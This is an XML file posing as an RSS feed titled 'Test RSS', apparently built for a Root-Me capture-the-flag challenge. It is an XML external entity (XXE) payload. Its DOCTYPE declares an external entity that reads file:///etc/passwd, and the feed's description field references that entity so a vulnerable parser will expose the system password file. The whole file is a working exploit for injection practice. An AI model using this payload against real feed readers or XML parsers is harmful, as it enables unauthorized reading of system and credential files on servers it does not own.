<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
   <!ELEMENT rss (channel)>
   <!ATTLIST rss version CDATA #REQUIRED>
   <!ELEMENT channel (title, link, description)>
   <!ELEMENT title (#PCDATA)>
   <!ELEMENT link (#PCDATA)>
   <!ELEMENT description (#PCDATA)>
   <!ENTITY ez SYSTEM "file:///etc/passwd">
]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
       <title>Test RSS</title>
       <link>http://example.com</link>
       <atom:link href="https://raw.githubusercontent.com/Asthral/CheatSheetTool/refs/heads/main/RootMe/test.xml" rel="self" type="application/rss+xml" />
       <description>Injected: &#38;ez;</description>
   </channel>
</rss>
